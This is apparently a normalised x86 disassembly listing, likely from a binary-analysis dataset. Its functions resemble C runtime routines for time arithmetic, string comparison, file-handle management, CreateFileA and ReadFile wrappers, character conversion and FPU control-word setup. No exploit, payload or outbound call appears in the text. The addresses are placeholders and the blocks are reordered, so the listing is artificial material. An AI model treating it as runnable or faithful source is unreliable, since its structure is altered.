imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jge r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_413bc0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_40e83e
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_40e89f
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_414c8a
mov ebx eax
add esp 0x4
call sub_414c8a
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_413cf7
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_40e7ac
mov [ eax ] 0x9
call sub_40e7b5
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4141df
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_413d5c
push esi
mov edi eax
call sub_41423e
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_413d5c
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_41419d
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_40e7ac
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_40e739
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_413dcf
inc [ rw-data ]
push 0x1000
call sub_40bb22
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_413e13
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_413e3c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413e95
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_40e83e
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_40e89f
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_413e95
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_40e7ac
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_413efe
push ebx
push edi
push 0x2
xor ebx ebx
call sub_40e83e
pop ecx
push 0x3
pop edi
cmp [ rw-data ] edi
jle r-xdata
push 0x2
call sub_40e89f
pop ecx
mov eax ebx
pop edi
pop ebx
retn
push esi
inc edi
cmp edi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov eax [ rw-data ]
mov esi edi
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
pop esi
cmp edi 0x14
jl r-xdata
push eax
call sub_40c094
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_40c218
mov eax [ rw-data ]
pop ecx
and [ esi + eax ] 0x0
inc ebx
sub_413f7f
push ecx
push ecx
push ebx
push ebp
push esi
push edi
push 0x12
or edi 0xffffffff
call sub_40e83e
xor ebx ebx
pop ecx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov ebp rw-data
mov esi 0x480
push esi
call sub_40bb22
test eax eax
pop ecx
je r-xdata
lea eax [ esi + 0x480 ]
push 0x12
call sub_40e89f
pop ecx
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
add [ rw-data ] 0x20
lea ecx [ ebx * 4 + rw-data ]
lea edx [ eax + 0x480 ]
mov [ ecx ] eax
add [ esp + 0x14 ] 0x20
add ebp 0x4
inc ebx
cmp ebp rw-data
mov [ esp + 0x10 ] ebx
jl r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl ebx 0x5
mov edi ebx
push edi
call sub_4141df
pop ecx
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x24
add edx esi
jmp r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp ]
add esi 0x24
add eax 0x480
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp eax edx
jae r-xdata
cmp esi eax
jae r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
push 0x11
call sub_40e83e
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
or [ esi ] 0xffffffff
mov eax esi
sub eax [ ebp ]
push 0x24
pop ecx
cdq
idiv ecx
mov edi eax
add edi [ esp + 0x14 ]
cmp edi 0xffffffff
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
mov ebx [ esp + 0x10 ]
push 0x11
call sub_40e89f
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov ebx [ esp + 0x10 ]
sub_4140a2
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_40e7ac
mov [ eax ] 0x9
call sub_40e7b5
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
cmp [ eax + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_41411e
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_40e7ac
mov [ eax ] 0x9
call sub_40e7b5
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_41419d
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_40e7ac
mov [ eax ] 0x9
call sub_40e7b5
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_4141df
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_40e83e
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_40e89f
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_414260
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_40e7ac
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_4141df
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40e7ac
mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_41419d
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_41423e
pop ecx
mov eax esi
jmp r-xdata
call sub_40e7b5
mov [ eax ] esi
test esi esi
je r-xdata
sub_4142f3
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_414350
add esp 0xc
mov [ ebp + 0x10 ] eax
test ebx ebx
je r-xdata
push esi
call edi
push 0x13
call sub_40e83e
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_40e89f
pop ecx
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_414350
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov al [ esi ]
cmp al bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
push 0x1
pop eax
jmp r-xdata
movzx ax al
mov [ ecx ] ax
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp + 0x10 ] eax
jl r-xdata
pop esi
pop ebx
pop ebp
retn
call sub_40e7ac
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ esi + 0x1 ] bl
jne r-xdata
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
setne cl
push ecx
push [ ebp + 0x8 ]
push eax
push esi
push 0x9
push [ rw-data ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
sub_414419
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
retn
push 0x8
push [ esp + 0x8 ]
call sub_410aa5
pop ecx
pop ecx
retn
sub_414450
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_41446f
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx 0xffffffff
push esi
je r-xdata
or eax 0xffffffff
mov esi [ esp + 0x10 ]
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_413dcf
pop ecx
test al 0x2
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
dec [ esi ]
mov eax [ esi ]
mov [ eax ] bl
dec [ esi ]
mov eax [ esi ]
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and al 0xef
or al 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_4144dd
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
jne r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
call sub_40e7ac
mov [ eax ] 0x16
call sub_40e7b5
mov [ eax ] ebx
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_413f7f
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi 0x10000000
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
call sub_40e7ac
mov [ eax ] 0x18
call sub_40e7b5
and [ eax ] 0x0
mov eax edi
jmp r-xdata
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_40e739
pop ecx
mov esi edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
push ebx
call sub_41423e
pop ecx
mov eax esi
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_4140a2
mov eax ebx
pop ecx
sar eax 0x5
pop ecx
mov cl [ ebp - 0x1 ]
lea edi [ eax * 4 + rw-data ]
mov eax ebx
or cl 0x1
and eax 0x1f
mov [ ebp + 0xb ] cl
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
and [ ebp + 0xb ] 0x48
mov [ eax + esi + 0x4 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test cl 0x80
je r-xdata
mov esi ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_413d5c
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_414811
add esp 0xc
test eax eax
jne r-xdata
call sub_40e7b5
cmp [ eax ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_413d5c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
push ebx
call sub_410863
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebp - 0x10 ]
push ebx
call sub_41550f
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_4147ac
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_40e7ac
mov [ eax ] 0x9
call sub_40e7b5
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4141df
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_414811
push esi
mov edi eax
call sub_41423e
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_414811
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edx ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea esi [ eax + eax * 8 ]
mov eax [ ecx * 4 + rw-data ]
lea edi [ ecx * 4 + rw-data ]
shl esi 0x2
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x2
jne r-xdata
test cl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ edi ]
push [ ebp + 0x10 ]
push edx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ edi ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
dec [ ebp + 0x10 ]
mov [ ebx ] al
mov eax [ edi ]
lea edx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
je r-xdata
call sub_40e7ac
mov [ eax ] 0x9
call sub_40e7b5
mov [ eax ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and al 0xfb
cmp [ ebx ] 0xa
jne r-xdata
push eax
call sub_40e739
pop ecx
or eax 0xffffffff
jmp r-xdata
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ edi ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ ebx ] al
inc ebx
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ edi ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc ebx
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_413d5c
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ ebx ] 0xd
mov ecx [ edi ]
inc ebx
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_4149fb
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_414a2c
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_414ab5
push ebp
mov ebp esp
push ecx
push esi
fwait
fnstcw [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_414b00
mov esi eax
mov eax [ ebp + 0xc ]
not eax
and esi eax
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
or esi eax
push esi
call sub_414b92
pop ecx
mov [ ebp + 0xc ] eax
pop ecx
fldcw [ ebp + 0xc ]
mov eax esi
pop esi
leave
retn
sub_414b00
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push ebp
test bl 0x1
push edi
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop eax
test bl 0x8
je r-xdata
or al 0x8
test bl 0x10
je r-xdata
or al 0x4
test bl 0x20
je r-xdata
or al 0x2
test bl 0x2
je r-xdata
or al 0x1
movzx ecx bx
push esi
mov edx ecx
mov esi 0xc00
mov edi 0x300
and edx esi
mov ebp 0x200
je r-xdata
or eax 0x80000
and ecx edi
pop esi
je r-xdata
cmp edx 0x400
je r-xdata
or eax 0x20000
cmp ecx ebp
jne r-xdata
or ah 0x1
cmp edx 0x800
je r-xdata
retn
or eax 0x40000
pop edi
pop ebp
test bh 0x10
pop ebx
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebp
jmp r-xdata
cmp edx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_414b92
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
push 0x1
pop eax
test bl 0x4
je r-xdata
or al 0x4
test bl 0x2
je r-xdata
or al 0x8
test bl 0x1
je r-xdata
or al 0x10
test ebx 0x80000
je r-xdata
or al 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
mov esi 0x200
je r-xdata
or al 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or ah 0x4
cmp ecx esi
je r-xdata
retn
or ah 0x10
pop esi
test ebx 0x40000
pop ebx
je r-xdata
or eax esi
jmp r-xdata
or ah 0x8
jmp r-xdata
cmp ecx edx
jne r-xdata
or ah 0xc
jmp r-xdata
sub_414c1b
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
